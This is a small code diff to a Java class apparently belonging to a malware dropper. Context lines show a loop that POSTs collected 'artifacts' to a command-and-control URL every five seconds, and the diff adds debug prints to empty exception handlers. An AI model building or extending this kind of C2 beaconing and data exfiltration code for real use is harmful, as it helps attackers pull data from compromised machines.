@@ -39,11 +39,13 @@ public class DropperBackgroundService {
                     sendPOST(c2Url + "/artifacts", gson.toJson(artifact));
                 }
             } catch (IOException e) {
+                System.out.println("IO 42");
             }
 
             try {
                 Thread.sleep(5000);
             } catch (InterruptedException e) {
+                System.out.println("Int 48");
             }
         }
     }
